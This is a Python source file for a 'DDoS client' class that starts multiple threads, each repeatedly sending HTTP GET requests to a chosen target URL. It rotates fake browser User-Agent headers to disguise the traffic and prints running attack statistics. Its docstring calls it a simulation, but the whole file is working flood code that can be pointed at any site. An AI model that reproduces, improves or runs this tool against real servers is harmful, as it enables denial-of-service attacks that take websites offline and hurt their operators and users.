"""
DDoS Client implementation for simulating distributed attacks
"""

import threading
import time
import requests
import random
from urllib.parse import urlparse


class DDOSClient:
    """Main DDoS client class"""

    def __init__(self, target, num_threads=10):
        self.target = self._format_target(target)
        self.num_threads = num_threads
        self.attack_running = False
        self.attack_stats = {
            'requests_sent': 0,
            'success_count': 0,
            'error_count': 0
        }
        self.lock = threading.Lock()

    def _format_target(self, target):
        """Ensure target has proper protocol"""
        if not target.startswith(('http://', 'https://')):
            # Try HTTPS first, fallback to HTTP
            try:
                requests.get(f"https://{target}", timeout=3)
                return f"https://{target}"
            except:
                return f"http://{target}"
        return target

    def send_request(self):
        """Send a single HTTP request to the target"""
        if not self.attack_running:
            return

        try:
            user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0'
            ]

            headers = {
                'User-Agent': random.choice(user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            }

            response = requests.get(self.target, headers=headers, timeout=5)

            with self.lock:
                self.attack_stats['requests_sent'] += 1
                if 200 <= response.status_code < 400:
                    self.attack_stats['success_count'] += 1
                else:
                    self.attack_stats['error_count'] += 1

            return {
                'status': 'success',
                'code': response.status_code,
                'message': f"{response.status_code} - {self.target}"
            }

        except requests.exceptions.Timeout:
            with self.lock:
                self.attack_stats['requests_sent'] += 1
                self.attack_stats['error_count'] += 1
            return {
                'status': 'error',
                'type': 'timeout',
                'message': f"TIMEOUT - {self.target}"
            }

        except requests.exceptions.ConnectionError:
            with self.lock:
                self.attack_stats['requests_sent'] += 1
                self.attack_stats['error_count'] += 1
            return {
                'status': 'error',
                'type': 'connection',
                'message': f"CONNECTION ERROR - {self.target}"
            }

        except Exception as e:
            with self.lock:
                self.attack_stats['requests_sent'] += 1
                self.attack_stats['error_count'] += 1
            return {
                'status': 'error',
                'type': 'exception',
                'message': f"ERROR: {str(e)[:50]} - {self.target}"
            }

    def attack_thread(self):
        """Individual attack thread that sends continuous requests"""
        while self.attack_running:
            result = self.send_request()
            if result:
                print(f"[{self.attack_stats['requests_sent']}] {result['message']}")
            time.sleep(0.05)

    def start_attack(self):
        """Start the DDoS attack using multiple threads"""
        self.attack_running = True
        print(f"\n[+] Starting DDoS attack on {self.target}")
        print(f"[+] Using {self.num_threads} threads")
        print("[+] Press Ctrl+C to stop the attack\n")

        threads = []
        for i in range(self.num_threads):
            thread = threading.Thread(target=self.attack_thread)
            thread.daemon = True
            thread.start()
            threads.append(thread)
            time.sleep(0.01)

        try:
            while self.attack_running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop_attack()

    def stop_attack(self):
        """Stop the ongoing attack"""
        print("\n[!] Stopping attack...")
        self.attack_running = False
        time.sleep(2)

        print(f"\n[+] Attack Summary:")
        print(f"    Total Requests Sent: {self.attack_stats['requests_sent']}")
        print(f"    Successful Requests: {self.attack_stats['success_count']}")
        print(f"    Failed Requests: {self.attack_stats['error_count']}")
